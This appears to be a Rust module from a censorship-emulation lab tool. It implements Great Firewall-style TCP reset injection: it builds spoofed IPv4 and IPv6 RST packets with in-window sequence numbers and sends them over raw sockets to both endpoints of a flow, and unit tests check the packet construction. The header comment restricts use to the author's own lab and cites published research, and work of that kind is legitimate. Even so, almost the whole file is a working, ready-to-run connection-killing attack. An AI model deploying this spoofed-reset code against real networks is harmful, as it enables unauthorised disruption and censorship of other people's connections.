// Phase 3: TCP RST injection - replicates the GFW's connection-reset technique.
// Own lab only: send spoofed RSTs to both endpoints of a matched flow so each side
// thinks the *other* tore down the connection, same as the documented GFW behavior
// (Clayton et al. 2006). Needs root (raw IP socket).
use pnet::packet::ipv4::{checksum as ipv4_checksum, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{ipv4_checksum as tcp_checksum, ipv6_checksum as tcp_checksum_v6, MutableTcpPacket, TcpFlags};
use pnet::transport::{transport_channel, TransportChannelType};
pub use pnet::transport::TransportSender;
use pnet::packet::ip::IpNextHeaderProtocols;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

const IP_HDR_LEN: usize = 20;
const IPV6_HDR_LEN: usize = 40;
const TCP_HDR_LEN: usize = 20;

/// Build a spoofed IPv4/TCP RST packet: appears to come from `src`, sent to `dst`,
/// with `seq` set so it falls inside the victim's receive window.
fn build_rst(src: Ipv4Addr, src_port: u16, dst: Ipv4Addr, dst_port: u16, seq: u32) -> Vec<u8> {
    let mut buf = vec![0u8; IP_HDR_LEN + TCP_HDR_LEN];

    {
        let mut tcp = MutableTcpPacket::new(&mut buf[IP_HDR_LEN..]).unwrap();
        tcp.set_source(src_port);
        tcp.set_destination(dst_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(0);
        tcp.set_data_offset(5); // 20-byte header, no options
        tcp.set_flags(TcpFlags::RST);
        tcp.set_window(0);
        let cksum = tcp_checksum(&tcp.to_immutable(), &src, &dst);
        tcp.set_checksum(cksum);
    }

    {
        let mut ip = MutableIpv4Packet::new(&mut buf).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length((IP_HDR_LEN + TCP_HDR_LEN) as u16);
        ip.set_ttl(64);
        ip.set_flags(Ipv4Flags::DontFragment);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(src);
        ip.set_destination(dst);
        let cksum = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(cksum);
    }

    buf
}

pub fn open_raw_sender() -> std::io::Result<TransportSender> {
    let (tx, _rx) = transport_channel(4096, TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp))?;
    Ok(tx)
}

/// Build a spoofed IPv6/TCP RST packet - same shape as `build_rst`, just the
/// v6 header (fixed 40 bytes, no header-length field to set) and pnet's v6
/// TCP checksum (RFC 8200 pseudo-header, computed for us - no hand-rolled
/// pseudo-header math needed).
fn build_rst_v6(src: Ipv6Addr, src_port: u16, dst: Ipv6Addr, dst_port: u16, seq: u32) -> Vec<u8> {
    let mut buf = vec![0u8; IPV6_HDR_LEN + TCP_HDR_LEN];

    {
        let mut tcp = MutableTcpPacket::new(&mut buf[IPV6_HDR_LEN..]).unwrap();
        tcp.set_source(src_port);
        tcp.set_destination(dst_port);
        tcp.set_sequence(seq);
        tcp.set_acknowledgement(0);
        tcp.set_data_offset(5);
        tcp.set_flags(TcpFlags::RST);
        tcp.set_window(0);
        let cksum = tcp_checksum_v6(&tcp.to_immutable(), &src, &dst);
        tcp.set_checksum(cksum);
    }

    {
        let mut ip = pnet::packet::ipv6::MutableIpv6Packet::new(&mut buf).unwrap();
        ip.set_version(6);
        ip.set_payload_length(TCP_HDR_LEN as u16);
        ip.set_next_header(IpNextHeaderProtocols::Tcp);
        ip.set_hop_limit(64);
        ip.set_source(src);
        ip.set_destination(dst);
    }

    buf
}

/// Raw IPv6 TCP-RST sender via IPV6_HDRINCL - same platform restriction as
/// `redirect::Ipv6DnsSender` (see its doc comment): confirmed absent from
/// macOS's libc bindings, spoofing the source address needs it, no degraded
/// fallback exists. `Engine` opens this only when `--inject` is set and
/// treats a platform error the same way `dns_redirect_v6` already does -
/// `None`, IPv6 RST silently unavailable rather than a startup panic.
pub struct Ipv6RstSender {
    #[cfg(target_os = "linux")]
    fd: std::os::fd::RawFd,
}

#[cfg(target_os = "linux")]
impl Ipv6RstSender {
    pub fn open() -> std::io::Result<Self> {
        unsafe {
            let fd = libc::socket(libc::AF_INET6, libc::SOCK_RAW, libc::IPPROTO_TCP);
            if fd < 0 {
                return Err(std::io::Error::last_os_error());
            }
            let on: libc::c_int = 1;
            let res = libc::setsockopt(
                fd,
                libc::IPPROTO_IPV6,
                libc::IPV6_HDRINCL,
                &on as *const _ as *const libc::c_void,
                std::mem::size_of::<libc::c_int>() as libc::socklen_t,
            );
            if res < 0 {
                let e = std::io::Error::last_os_error();
                libc::close(fd);
                return Err(e);
            }
            Ok(Self { fd })
        }
    }

    fn send_raw(&self, packet: &[u8], dst: Ipv6Addr) -> std::io::Result<()> {
        unsafe {
            let mut addr: libc::sockaddr_in6 = std::mem::zeroed();
            addr.sin6_family = libc::AF_INET6 as libc::sa_family_t;
            addr.sin6_addr = libc::in6_addr { s6_addr: dst.octets() };
            let ret = libc::sendto(
                self.fd,
                packet.as_ptr() as *const libc::c_void,
                packet.len(),
                0,
                &addr as *const _ as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_in6>() as libc::socklen_t,
            );
            if ret < 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(())
        }
    }
}

#[cfg(target_os = "linux")]
impl Drop for Ipv6RstSender {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.fd);
        }
    }
}

#[cfg(not(target_os = "linux"))]
impl Ipv6RstSender {
    pub fn open() -> std::io::Result<Self> {
        Err(std::io::Error::other(
            "IPv6 RST injection needs IPV6_HDRINCL, which this platform's raw IPv6 socket \
             API doesn't support (confirmed absent from macOS's libc bindings) - run on \
             Linux for this feature, or use --inject for IPv4 only.",
        ))
    }

    fn send_raw(&self, _packet: &[u8], _dst: Ipv6Addr) -> std::io::Result<()> {
        unreachable!("Ipv6RstSender::open() always errors on this platform, so this is never called")
    }
}

/// IPv6 counterpart to `reset_flow` - same both-sides-reset shape, sent over
/// the platform-gated `Ipv6RstSender` instead of a `TransportSender`.
pub fn reset_flow_v6(
    tx: &Ipv6RstSender,
    a: Ipv6Addr,
    a_port: u16,
    b: Ipv6Addr,
    b_port: u16,
    seq_to_b: u32,
    seq_to_a: u32,
) -> std::io::Result<()> {
    let to_b = build_rst_v6(a, a_port, b, b_port, seq_to_b);
    let to_a = build_rst_v6(b, b_port, a, a_port, seq_to_a);
    tx.send_raw(&to_b, b)?;
    tx.send_raw(&to_a, a)?;
    Ok(())
}

/// Reset both sides of a flow. `seq_to_b` = next seq the sender (A) hasn't used yet
/// (so B accepts a RST claiming to be from A); `seq_to_a` = the ack field A sent
/// (the seq B already told A about, so A accepts a RST claiming to be from B).
pub fn reset_flow(
    tx: &mut TransportSender,
    a: Ipv4Addr,
    a_port: u16,
    b: Ipv4Addr,
    b_port: u16,
    seq_to_b: u32,
    seq_to_a: u32,
) -> std::io::Result<()> {
    let to_b = build_rst(a, a_port, b, b_port, seq_to_b);
    let to_a = build_rst(b, b_port, a, a_port, seq_to_a);
    tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&to_b).unwrap(), IpAddr::V4(b))?;
    tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&to_a).unwrap(), IpAddr::V4(a))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use pnet::packet::ipv4::Ipv4Packet;
    use pnet::packet::tcp::TcpPacket;
    use pnet::packet::Packet;

    #[test]
    fn rst_packet_is_well_formed() {
        let src = Ipv4Addr::new(10, 0, 0, 1);
        let dst = Ipv4Addr::new(10, 0, 0, 2);
        let raw = build_rst(src, 1234, dst, 443, 999);

        let ip = Ipv4Packet::new(&raw).unwrap();
        assert_eq!(ip.get_source(), src);
        assert_eq!(ip.get_destination(), dst);
        assert_eq!(ip.get_next_level_protocol(), IpNextHeaderProtocols::Tcp);
        // verify the stored checksum matches a fresh recomputation (zero the field first)
        let mut recompute = ip.packet().to_vec();
        recompute[10] = 0;
        recompute[11] = 0;
        let fresh = Ipv4Packet::new(&recompute).unwrap();
        assert_eq!(ipv4_checksum(&fresh), ip.get_checksum());

        let tcp = TcpPacket::new(ip.payload()).unwrap();
        assert_eq!(tcp.get_source(), 1234);
        assert_eq!(tcp.get_destination(), 443);
        assert_eq!(tcp.get_sequence(), 999);
        assert_eq!(tcp.get_flags(), TcpFlags::RST);
        let cksum = tcp_checksum(&tcp, &src, &dst);
        assert_eq!(cksum, tcp.get_checksum());
    }

    #[test]
    fn v6_rst_packet_is_well_formed() {
        // Pure packet-building is testable on every platform even though actually
        // *sending* it only works on Linux (see Ipv6RstSender's doc comment).
        let src: Ipv6Addr = "fe80::1".parse().unwrap();
        let dst: Ipv6Addr = "fe80::39".parse().unwrap();
        let raw = build_rst_v6(src, 1234, dst, 443, 999);

        let ip = pnet::packet::ipv6::Ipv6Packet::new(&raw).unwrap();
        assert_eq!(ip.get_version(), 6);
        assert_eq!(ip.get_source(), src);
        assert_eq!(ip.get_destination(), dst);
        assert_eq!(ip.get_next_header(), IpNextHeaderProtocols::Tcp);
        assert_eq!(ip.get_payload_length(), TCP_HDR_LEN as u16);

        let tcp = TcpPacket::new(ip.payload()).unwrap();
        assert_eq!(tcp.get_source(), 1234);
        assert_eq!(tcp.get_destination(), 443);
        assert_eq!(tcp.get_sequence(), 999);
        assert_eq!(tcp.get_flags(), TcpFlags::RST);
        let cksum = tcp_checksum_v6(&tcp, &src, &dst);
        assert_eq!(cksum, tcp.get_checksum());
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn v6_rst_sender_reports_platform_limitation_not_silent_failure() {
        match Ipv6RstSender::open() {
            Err(e) => assert!(e.to_string().contains("IPV6_HDRINCL")),
            Ok(_) => panic!("expected an error on this platform"),
        }
    }
}
